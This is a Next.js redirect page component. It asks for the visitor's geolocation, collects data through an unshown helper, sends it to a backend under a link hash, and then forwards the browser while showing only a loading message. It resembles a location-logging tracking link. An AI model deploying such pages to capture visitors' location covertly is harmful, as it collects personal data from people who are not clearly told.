"use client";
import React from "react";
import { useEffect } from "react";
import ErrorPage from "../../../components/ui/error-page";
import processData from "../../../utils/getdata";
import { useParams } from "next/navigation";
import {collect_user_data} from '../../../utils/api/collect_user_data'
export default function Redirect() {
  try {
    const params = useParams<{ hash: string }>();
    const hash = params.hash;
    useEffect(() => {
  async function fetch() {
    let geolocationPermission: string | undefined;

    try {
      // Request permission by trying to get position
      await new Promise<void>((resolve, reject) => {
        navigator.geolocation.getCurrentPosition(
          () => resolve(),
          () => reject()
        );
      });

      // Check permission state afterward (optional)
      const perm = await (navigator as any).permissions?.query?.({
        name: "geolocation",
      });
      geolocationPermission = perm?.state || "granted";
      const data = await processData()();
      const updatedData = {
        ...data,
        permissions: { geolocation: geolocationPermission },
      };
      
      const response=await collect_user_data(data,hash)
      window.location.href = response?.url
      // await redirectUser(hash);
    } catch (err) {
      geolocationPermission = "denied";
      console.log("User denied location access.");
    }
  }

  fetch();
}, []);

  } catch (error: any) {
    return <ErrorPage />;
  }
  return (
    <div className=" w-full h-screen bg-gray-100 flex items-center justify-center ">
      <p className="w-fit  mx-auto text-base sm:text-2xl font-sans text-indigo-950">
        Loading... wait for a moment!
      </p>
    </div>
  );
}
